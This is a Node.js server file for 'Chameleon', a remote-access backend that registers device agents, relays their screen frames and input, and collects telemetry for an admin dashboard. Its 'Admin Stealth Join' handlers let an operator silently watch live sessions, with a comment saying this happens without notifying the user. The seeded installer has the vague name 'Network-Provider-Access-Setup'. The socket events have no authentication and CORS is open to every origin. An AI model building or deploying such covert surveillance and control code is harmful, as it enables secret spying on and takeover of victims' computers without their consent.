require('dotenv').config();
const express = require('express');
const http = require('http');
const cors = require('cors');
const mongoose = require('mongoose');
const { Server } = require('socket.io');

const Version = require('./models/Version');
const Log = require('./models/Log');
const Session = require('./models/Session');
const Device = require('./models/Device');

// Route Imports
const agentRoutes = require('./routes/agent');
const authRoutes = require('./routes/auth');
const deviceRoutes = require('./routes/devices');
const sessionRoutes = require('./routes/sessions');
const versionRoutes = require('./routes/versions');
const logRoutes = require('./routes/logs');

const app = express();
const server = http.createServer(app);

// CORS Config
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
}));
app.use(express.json());

// Set up in-memory command buffer
const activeCommands = {};
app.set('activeCommands', activeCommands);

// Connect to MongoDB Atlas / Local MongoDB
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chameleon_admin';
mongoose.connect(MONGODB_URI)
  .then(async () => {
    console.log('[DB] Connected successfully to MongoDB');
    
    // Seed default stable version on startup if database is empty
    const count = await Version.countDocuments();
    if (count === 0) {
      await Version.create({
        version: '1.4.0',
        downloadUrl: 'https://chameleon-jet.vercel.app/Network-Provider-Access-Setup-1.4.0.exe',
        isStable: true,
        isDeprecated: false,
        installedCount: 0,
        pendingUpdateCount: 0
      });
      console.log('[DB] Seeded initial stable release version v1.4.0');
    }
  })
  .catch((err) => {
    console.error('[DB] Connection failure:', err);
  });

// Mount REST Endpoints
app.use('/api/agent', agentRoutes);
app.use('/api/admin/auth', authRoutes);
app.use('/api/admin/devices', deviceRoutes);
app.use('/api/admin/sessions', sessionRoutes);
app.use('/api/admin/versions', versionRoutes);
app.use('/api/admin/logs', logRoutes);

// Base Ping
app.get('/ping', (req, res) => {
  res.send('pong');
});

// Root Welcome Route
app.get('/', (req, res) => {
  res.send('Chameleon Signaling Backend is running. Please access the admin dashboard on the frontend port (default 5173).');
});

// Configure Socket.IO
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});
app.set('io', io);

// Keep track of active WebRTC signaling sockets
const activeSocketSessions = new Map();

io.on('connection', (socket) => {
  console.log(`[Socket] Connected client: ${socket.id}`);

  // Room Joinings
  socket.on('join:device', (deviceId) => {
    socket.join(`device:${deviceId}`);
    console.log(`[Socket] Device ${deviceId} joined room device:${deviceId}`);
  });

  socket.on('join:session', (sessionId) => {
    socket.join(`session:${sessionId}`);
    console.log(`[Socket] Session ${sessionId} joined room session:${sessionId}`);
  });

  socket.on('join:admin', () => {
    socket.join('admin:dashboard');
    console.log('[Socket] Administrator joined dashboard room');
  });

  // Telemetry relay from Agent -> Admin
  socket.on('telemetry:stream', ({ deviceId, cpuUsage, ramUsage, diskUsage, agentUptime }) => {
    io.to('admin:dashboard').emit('telemetry:data', { 
      deviceId, cpuUsage, ramUsage, diskUsage, agentUptime, timestamp: Date.now() 
    });
  });

  // WebRTC metrics relay from Session -> Admin
  socket.on('session:metrics', ({ sessionId, fps, bitrate, latency, packetLoss, resolution }) => {
    io.to('admin:dashboard').emit('session:data', {
      sessionId, fps, bitrate, latency, packetLoss, resolution, timestamp: Date.now()
    });
  });

  // ── WebRTC Signaling ──
  socket.on('agent:create_session', (data) => {
    let sessionId = data && data.sessionId;
    if (!sessionId) {
      sessionId = Math.floor(100000 + Math.random() * 900000).toString();
    }
    
    const deviceId = (data && data.deviceId) || 'DEV-REAL-' + socket.id.substring(0, 5);
    
    activeSocketSessions.set(sessionId, {
      agentSocketId: socket.id,
      deviceId: deviceId,
      clientSocketId: null,
      adminSocketIds: new Set(),
      createdAt: Date.now()
    });
    
    socket.emit('agent:session_created', { sessionId, expiresIn: 0 });
    console.log(`[Signaling] Session ${sessionId} created by agent ${socket.id}`);

    // Sync to database
    Session.findOneAndUpdate(
      { sessionId },
      {
        sessionId,
        deviceId,
        sessionCode: sessionId,
        clientLink: `https://chameleon-jet.vercel.app/?sess=${sessionId}`,
        status: 'active',
        startTime: new Date()
      },
      { upsert: true }
    ).catch(err => console.error('[DB Sync] Session create error:', err));
    
    Log.create({
      eventType: 'Session Started',
      deviceId,
      sessionId,
      description: `Real agent started session ${sessionId}`,
      severity: 'info'
    }).catch(err => {});

    Device.findOneAndUpdate(
      { deviceId },
      {
        deviceId,
        status: 'online',
        lastHeartbeat: new Date()
      },
      { upsert: true }
    ).catch(err => {});
  });

  socket.on('client:join_session', ({ sessionId }) => {
    const session = activeSocketSessions.get(sessionId);
    if (!session) {
      return socket.emit('error', { message: 'Session not found' });
    }
    
    session.clientSocketId = socket.id;
    io.to(session.agentSocketId).emit('client:joined', { clientSocketId: socket.id });
    console.log(`[Signaling] Client ${socket.id} joined session ${sessionId}`);

    Session.findOneAndUpdate(
      { sessionId },
      { status: 'active' }
    ).catch(err => {});
  });

  socket.on('signal:sdp', ({ sessionId, sdp, to }) => {
    const session = activeSocketSessions.get(sessionId);
    if (!session) return;
    const targetSocketId = to === 'agent' ? session.agentSocketId : session.clientSocketId;
    if (targetSocketId) {
      io.to(targetSocketId).emit('signal:sdp', { sdp, from: socket.id });
    }
  });

  socket.on('signal:ice', ({ sessionId, candidate, to }) => {
    const session = activeSocketSessions.get(sessionId);
    if (!session) return;
    const targetSocketId = to === 'agent' ? session.agentSocketId : session.clientSocketId;
    if (targetSocketId) {
      io.to(targetSocketId).emit('signal:ice', { candidate, from: socket.id });
    }
  });

  socket.on('client:request_relay', ({ sessionId }) => {
    const session = activeSocketSessions.get(sessionId);
    if (session && session.agentSocketId) {
      io.to(session.agentSocketId).emit('agent:start_relay', { sessionId });
    }
  });

  socket.on('relay:frame', ({ sessionId, frame }, ackCallback) => {
    if (typeof ackCallback === 'function') ackCallback();
    const session = activeSocketSessions.get(sessionId);
    if (session && session.clientSocketId) {
      io.to(session.clientSocketId).volatile.emit('relay:frame', frame);
    }
    // Also forward relay frames to admin if any are observing
    if (session && session.adminSocketIds.size > 0) {
      for (const adminId of session.adminSocketIds) {
        io.to(adminId).volatile.emit('relay:frame', frame);
      }
    }
  });

  socket.on('relay:input', ({ sessionId, input }) => {
    const session = activeSocketSessions.get(sessionId);
    if (session && session.agentSocketId) {
      io.to(session.agentSocketId).emit('relay:input', input);
    }
  });

  // ── Admin Stealth Join & Observation ──
  socket.on('admin:join_session', ({ sessionId }) => {
    const session = activeSocketSessions.get(sessionId);
    if (!session) {
      return socket.emit('error', { message: 'Active pairing session not found on this signaling server' });
    }
    
    session.adminSocketIds.add(socket.id);
    console.log(`[Stealth] Admin ${socket.id} stealth-joined session ${sessionId}`);
    
    // Request agent to start a new peer connection for this admin (without notifying user)
    io.to(session.agentSocketId).emit('admin:join', { sessionId, adminSocketId: socket.id });
  });

  socket.on('admin:signal:sdp', ({ sessionId, sdp, to }) => {
    const session = activeSocketSessions.get(sessionId);
    if (!session) return;
    if (to) {
      // Sent from agent to a specific admin
      io.to(to).emit('admin:signal:sdp', { sdp, from: socket.id });
    } else {
      // Sent from admin to agent
      io.to(session.agentSocketId).emit('admin:signal:sdp', { sdp, from: socket.id });
    }
  });

  socket.on('admin:signal:ice', ({ sessionId, candidate, to }) => {
    const session = activeSocketSessions.get(sessionId);
    if (!session) return;
    if (to) {
      // Sent from agent to a specific admin
      io.to(to).emit('admin:signal:ice', { candidate, from: socket.id });
    } else {
      // Sent from admin to agent
      io.to(session.agentSocketId).emit('admin:signal:ice', { candidate, from: socket.id });
    }
  });

  socket.on('disconnect', () => {
    console.log(`[Socket] Client disconnected: ${socket.id}`);
    
    for (const [sessionId, session] of activeSocketSessions.entries()) {
      if (session.agentSocketId === socket.id) {
        if (session.clientSocketId) {
          io.to(session.clientSocketId).emit('session:ended', { reason: 'Host agent disconnected' });
        }
        for (const adminId of session.adminSocketIds) {
          io.to(adminId).emit('session:ended', { reason: 'Host agent disconnected' });
        }
        activeSocketSessions.delete(sessionId);
        console.log(`[Signaling] Session ${sessionId} closed because agent disconnected`);

        // Database Sync
        Session.findOneAndUpdate(
          { sessionId },
          { status: 'completed', endTime: new Date() }
        ).catch(err => {});

        Log.create({
          eventType: 'Session Ended',
          deviceId: session.deviceId,
          sessionId,
          description: `Session ${sessionId} completed (agent disconnected)`,
          severity: 'info'
        }).catch(err => {});

        Device.findOneAndUpdate(
          { deviceId: session.deviceId },
          { status: 'offline' }
        ).catch(err => {});

      } else if (session.clientSocketId === socket.id) {
        io.to(session.agentSocketId).emit('session:ended', { reason: 'Client disconnected' });
        session.clientSocketId = null;
        console.log(`[Signaling] Client disconnected from session ${sessionId}`);
      } else if (session.adminSocketIds.has(socket.id)) {
        session.adminSocketIds.delete(socket.id);
        io.to(session.agentSocketId).emit('admin:leave', { adminSocketId: socket.id });
        console.log(`[Stealth] Admin ${socket.id} left session ${sessionId}`);
      }
    }
  });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`[Server] Listening on port ${PORT}`);
});
